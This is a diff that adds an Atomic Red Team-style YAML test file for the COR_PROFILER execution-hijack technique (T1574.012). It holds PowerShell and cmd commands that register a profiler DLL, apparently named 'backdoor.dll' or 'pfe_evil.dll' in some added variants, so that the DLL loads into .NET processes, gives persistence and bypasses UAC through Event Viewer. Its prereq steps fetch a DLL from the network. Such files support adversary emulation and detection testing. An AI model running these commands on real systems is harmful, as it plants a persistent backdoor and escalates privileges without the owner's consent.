@@ -1,0 +1,262 @@
+atomic_tests:
+- auto_generated_guid: 9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a
+  dependencies:
+  - description: '#{file_name} must be present
+
+      '
+    get_prereq_command: 'New-Item -Type Directory (split-path #{file_name}) -ErrorAction
+      ignore | Out-Null
+
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
+      -OutFile "#{file_name}"
+
+      '
+    prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+      '
+  dependency_executor_name: powershell
+  description: 'Creates user scope environment variables and CLSID COM object to enable
+    a .NET profiler (COR_PROFILER).
+
+    The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded
+    by the Event Viewer process.
+
+    Additionally, the profiling DLL will inherit the integrity level of Event Viewer
+    bypassing UAC and executing `notepad.exe` with high integrity.
+
+    If the account used is not a local administrator the profiler DLL will still execute
+    each time the CLR is loaded by a process, however,
+
+    the notepad process will not execute with high integrity.
+
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
+
+    '
+  executor:
+    cleanup_command: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\"\
+      \ -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment\
+      \ -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty\
+      \ -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore\
+      \ | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\"\
+      \ -Force -ErrorAction Ignore | Out-Null\n"
+    command: 'Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}"
+      -ForegroundColor Cyan
+
+      New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value
+      #{file_name} -Force | Out-Null
+
+      New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType
+      String -Value "1" -Force | Out-Null
+
+      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType
+      String -Value "#{clsid_guid}" -Force | Out-Null
+
+      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType
+      String -Value #{file_name} -Force | Out-Null
+
+      Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
+
+      START MMC.EXE EVENTVWR.MSC
+
+      '
+    name: powershell
+  input_arguments:
+    clsid_guid:
+      default: '{09108e71-974c-4010-89cb-acf471ae9e3c}'
+      description: custom clsid guid
+      type: string
+    file_name:
+      default: C:\Users\anis\Desktop\backdoor.dll
+      description: unmanaged profiler DLL
+      type: path
+  name: User scope COR_PROFILER
+  supported_platforms:
+  - windows
+- auto_generated_guid: by_me
+  executor:
+    command: 'echo Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}
+
+      reg add HKCU\Software\Classes\CLSID\#{clsid_guid}\InprocServer32 /ve /t REG_SZ
+      /d #{file_name} /f
+
+      setx COR_ENABLE_PROFILING "1"
+
+      setx COR_PROFILER "#{clsid_guid}"
+
+      setx COR_PROFILER_PATH "#{file_name}"
+
+      echo executing eventvwr.msc
+
+      start eventvwr.msc
+
+      '
+    name: command_prompt
+  input_arguments:
+    clsid_guid:
+      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
+      description: custom clsid guid
+      type: string
+    file_name:
+      default: C:\Users\anis\Desktop\pfe_evil.dll
+      description: unmanaged profiler DLL
+      type: path
+  name: User scope COR_PROFILER ( command prompt version )
+  supported_platforms:
+  - windows
+- auto_generated_guid: f373b482-48c8-4ce4-85ed-d40c8b3f7310
+  dependencies:
+  - description: '#{file_name} must be present
+
+      '
+    get_prereq_command: 'New-Item -Type Directory (split-path #{file_name}) -ErrorAction
+      ignore | Out-Null
+
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
+      -OutFile "#{file_name}"
+
+      '
+    prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+      '
+  dependency_executor_name: powershell
+  description: 'Creates system scope environment variables to enable a .NET profiler
+    (COR_PROFILER). System scope environment variables require a restart to take effect.
+
+    The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded
+    by any process. Additionally, the profiling DLL will inherit the integrity
+
+    level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.
+    If the account used is not a local administrator the profiler DLL will
+
+    still execute each time the CLR is loaded by a process, however, the notepad process
+    will not execute with high integrity.
+
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
+
+    '
+  executor:
+    cleanup_command: 'Remove-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session
+      Manager\Environment'' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore
+      | Out-Null
+
+      Remove-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
+      -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
+
+      Remove-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
+      -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
+
+      '
+    command: 'Write-Host "Creating system environment variables" -ForegroundColor
+      Cyan
+
+      New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
+      -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+
+      New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
+      -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
+
+      New-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment''
+      -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force |
+      Out-Null
+
+      '
+    elevation_required: true
+    name: powershell
+  input_arguments:
+    clsid_guid:
+      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
+      description: custom clsid guid
+      type: string
+    file_name:
+      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
+      description: unmanaged profiler DLL
+      type: path
+  name: System Scope COR_PROFILER
+  supported_platforms:
+  - windows
+- auto_generated_guid: by_me
+  executor:
+    command: 'echo "Creating system environment variables"
+
+      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+      /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f > nul
+
+      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+      /v "COR_PROFILER" /t REG_SZ /d "#{clsid_guid}" /f > nul
+
+      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+      /v "COR_PROFILER_PATH" /t REG_SZ /d #{file_name} /f > nul
+
+      '
+    elevation_required: true
+    name: command_prompt
+  input_arguments:
+    clsid_guid:
+      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
+      description: custom clsid guid
+      type: string
+    file_name:
+      default: C:\Users\anis\Desktop\pfe_evil.dll
+      description: unmanaged profiler DLL
+      type: path
+  name: System Scope COR_PROFILER ( command prompt version )
+  supported_platforms:
+  - windows
+- auto_generated_guid: 79d57242-bbef-41db-b301-9d01d9f6e817
+  dependencies:
+  - description: '#{file_name} must be present
+
+      '
+    get_prereq_command: 'New-Item -Type Directory (split-path #{file_name}) -ErrorAction
+      ignore | Out-Null
+
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"
+      -OutFile "#{file_name}"
+
+      '
+    prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+      '
+  dependency_executor_name: powershell
+  description: 'Creates process scope environment variables to enable a .NET profiler
+    (COR_PROFILER) without making changes to the registry. The unmanaged profiler
+    DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.
+
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
+
+    '
+  executor:
+    cleanup_command: '$env:COR_ENABLE_PROFILING = 0
+
+      $env:COR_PROFILER = ''''
+
+      $env:COR_PROFILER_PATH = ''''
+
+      '
+    command: '$env:COR_ENABLE_PROFILING = 1
+
+      $env:COR_PROFILER = ''#{clsid_guid}''
+
+      $env:COR_PROFILER_PATH = ''#{file_name}''
+
+      POWERSHELL -c ''Start-Sleep 1''
+
+      '
+    name: powershell
+  input_arguments:
+    clsid_guid:
+      default: '{09108e71-974c-4010-89cb-acf471ae9e2c}'
+      description: custom clsid guid
+      type: string
+    file_name:
+      default: C:\Users\anis\Desktop\backdoor.dll
+      description: unamanged profiler DLL
+      type: path
+  name: Registry-free process scope COR_PROFILER
+  supported_platforms:
+  - windows
+attack_technique: T1574.012
+display_name: 'Hijack Execution Flow: COR_PROFILER'
